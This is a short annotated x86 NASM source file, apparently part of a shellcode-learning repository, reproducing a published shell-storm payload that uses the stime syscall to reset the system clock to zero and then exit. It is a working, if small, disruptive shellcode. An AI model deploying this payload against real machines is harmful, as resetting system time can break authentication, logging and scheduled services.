; Filename: stime.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  The base stime shellcode from shell-storm
;	    www.shell-storm.org/shellcode/files/shellcode-213.php


global _start			

section .text
_start:


;stime([0])

push byte 25 ; Push 25 to the stack
pop eax      ; Pop 25 into eax for the stime syscall
cdq          ; Extend eax into edx, clearing the edx register
push edx     ; Push edx to the stack (0)
mov ebx, esp ; Move stack pointer into ebx - the time parameter is pointed to
int 0x80     ; Interupt to syscall

;exit()

inc eax      ; On success, return value from stime is 0, inc to 1 for exit syscall
int 0x80     ; Call interupt to exit gracefully

